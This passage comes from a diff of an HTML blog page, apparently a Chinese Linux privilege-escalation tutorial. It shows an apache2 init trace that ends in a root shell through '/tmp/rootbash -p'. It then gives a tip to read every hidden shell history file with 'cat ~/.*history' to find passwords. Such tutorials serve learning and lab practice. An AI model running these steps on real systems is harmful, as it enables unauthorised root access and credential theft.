+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">1</span> -eq <span style="color:#ae81ff">2</span> -a <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">=</span> --full-restart <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -z apache2 <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -z <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span>ACTION<span style="color:#f92672">=</span>start
+</span></span><span style="display:flex;"><span>shift
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">0</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -r /etc/init/apache2.conf <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -x /etc/init.d/apache2 <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span>exec env -i LANG<span style="color:#f92672">=</span> PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM<span style="color:#f92672">=</span>dumb /etc/init.d/apache2 start
+</span></span><span style="display:flex;"><span>Starting web server: apache2httpd <span style="color:#f92672">(</span>pid 1728<span style="color:#f92672">)</span> already running
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>root@debian:~# /tmp/rootbash -p
+</span></span><span style="display:flex;"><span>root@debian:~# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h1 id="0x8-密码和密钥">0x8 密码和密钥<a href="#0x8-密码和密钥" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>如果用户不小心在命令行而不是在密码提示中输入密码，则可能会记录在历史文件中。</p>
+<p>查看用户家目录下所有隐藏历史文件的内容：</p>
+<p>​<code>cat ~/.*history | less</code>​</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>@badwichell</span>
+    
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
